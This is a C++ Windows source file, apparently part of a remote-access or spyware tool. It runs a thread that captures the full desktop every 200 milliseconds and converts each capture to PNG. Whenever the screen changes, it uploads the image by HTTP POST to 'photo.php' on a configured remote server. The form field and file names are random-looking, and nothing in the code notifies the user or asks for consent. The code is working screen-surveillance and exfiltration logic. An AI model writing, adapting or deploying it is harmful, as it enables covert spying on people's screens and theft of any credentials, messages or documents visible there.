
#include <WS2tcpip.h>
#include <Windows.h>
#include <process.h>
#include <GdiPlus.h>
#include <stdio.h>
using namespace Gdiplus;

#include <crc32.h>

#include "common.h"
#include "little.h"

bool bScreenThreadRun = false;
SOCKET sckScreen = INVALID_SOCKET;

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
   UINT  num = 0;          // number of image encoders
   UINT  size = 0;         // size of the image encoder array in bytes

   ImageCodecInfo* pImageCodecInfo = NULL;

   GetImageEncodersSize(&num, &size);
   if(size == 0)
      return -1;  // Failure

   pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
   if(pImageCodecInfo == NULL)
      return -1;  // Failure

   GetImageEncoders(num, size, pImageCodecInfo);

   for(UINT j = 0; j < num; ++j)
   {
      if( wcscmp(pImageCodecInfo[j].MimeType, format) == 0 )
      {
         *pClsid = pImageCodecInfo[j].Clsid;
         free(pImageCodecInfo);
         return j;  // Success
      }    
   }

   free(pImageCodecInfo);
   return -1;  // Failure
}


void screenthreadStart(void *lpThreadParameter)
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData))
        return;

    dword dwCRC32 = 0;

    HDC hWndDC, hMemDC;
    HWND hWndDesktop = GetDesktopWindow();
    RECT rc;
    HBITMAP hMemBmp;
    HPALETTE hPal;
    //HPALETTE hMemPal;

    CLSID clsidEncoder;
    GetEncoderClsid(L"image/png", &clsidEncoder);

    Bitmap* bm;
    Image* img;
    IStream *stream;

    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;

    char strHeader[2048];
    sprintf(strHeader, "POST "LittlePath"photo.php HTTP/1.1\r\nHost: %s\r\n", app.url.hostname);
    strcat(strHeader,
        "Connection: Keep-Alive\r\n"
        "Content-Type: multipart/form-data;"
        "boundary=----------------------------64b23e4066ed\r\n");
    const char strMid[] =
        "------------------------------64b23e4066ed\r\n"
        "Content-Disposition: form-data; name=\"WOKCAFECVAIEYCP\"; filename=\"ACKNCUQIDVALDKFJA.png\"\r\n"
        "Content-Type: image/png\r\n\r\n";
    const char strFoot[] = "\r\n------------------------------64b23e4066ed\r\n";
    int lenHeader = strlen(strHeader);
    int lenMid = strlen(strMid);
    int lenFoot = strlen(strFoot);
    int lenContent = lenMid + lenFoot;

    char str[1024];

    
    addrinfo hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    addrinfo *pai;
    if (bScreenThreadRun && getaddrinfo(app.url.hostname, "80", &hints, &pai) != 0)
        Sleep(2000);

    dword dwSend;

    while (bScreenThreadRun)
    {
        bm = nullptr;
        img = nullptr;
        stream = nullptr;
        try
        {
            hWndDC = GetWindowDC(hWndDesktop);
            hMemDC = CreateCompatibleDC(hWndDC);
            GetWindowRect(hWndDesktop, &rc);

            hMemBmp = CreateCompatibleBitmap(hWndDC, rc.right, rc.bottom);
            SelectObject(hMemDC, hMemBmp);

            BitBlt(hMemDC, 0, 0, rc.right, rc.bottom, hWndDC, 0, 0, SRCCOPY);

            hPal = SelectPalette(hMemDC, NULL, IGNORED);
            SelectPalette(hMemDC, hPal, IGNORED);

            GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

            bm = new Bitmap(hMemBmp, hPal);
            img = bm->GetThumbnailImage(960, 540);

            if (CreateStreamOnHGlobal(NULL, TRUE, &stream) != S_OK)
                throw "";

            if (img->Save(stream, &clsidEncoder) != S_OK)
                throw "";

            HGLOBAL hGlobal;
            if (GetHGlobalFromStream(stream, &hGlobal) != S_OK)
                throw "";
            DWORD dwSize = GlobalSize(hGlobal);
            LPVOID pData = GlobalLock(hGlobal);

            dword dw = crc32((byte*)pData, dwSize);
            if (dw != dwCRC32)
            {
                dwCRC32 = dw;

                sckScreen = socket(AF_INET, SOCK_STREAM, 0);
                SOCKET& sck = sckScreen;
                if (sckScreen == INVALID_SOCKET)
                    throw L"";

                try
                {
                    if (connect(sck, pai->ai_addr, pai->ai_addrlen) == SOCKET_ERROR)
                        throw L"";

                    if (send(sck, strHeader, lenHeader, 0) == SOCKET_ERROR)
                        throw L"";

                    sprintf(str, "Content-Length: %d\r\n\r\n", lenContent + dwSize);
                    if (send(sck, str, strlen(str), 0) == SOCKET_ERROR)
                        throw L"";
                    if (send(sck, strMid, lenMid, 0) == SOCKET_ERROR)
                        throw L"";
                    dwSend = 0;
                    while (dwSize - dwSend > 0)
                    {
                        dw = 2048;
                        if (dwSize - dwSend < dw)
                            dw = dwSize - dwSend;
                        if (send(sck, (const char*)pData + dwSend, dw, 0) == SOCKET_ERROR)
                            throw L"";
                        dwSend += dw;
                    }
                    if (send(sck, strFoot, lenFoot, 0) == SOCKET_ERROR)
                        throw L"";
                }
                catch (...)
                {
                    closesocket(sckScreen);
                    sckScreen = INVALID_SOCKET;
                    GlobalUnlock(hGlobal);
                    throw;
                }
                closesocket(sckScreen);
                sckScreen = INVALID_SOCKET;
            }
            GlobalUnlock(hGlobal);
        }
        catch (...)
        {
        }
        if (stream)
            stream->Release();
        if (img != nullptr)
            delete img;
        if (bm != nullptr)
            delete bm;

        GdiplusShutdown(gdiplusToken);

        DeleteObject(hMemBmp);
        DeleteObject(hMemDC);
        ReleaseDC(NULL, hWndDC);

        Sleep(200);
    }

    WSACleanup();
    _endthread();
}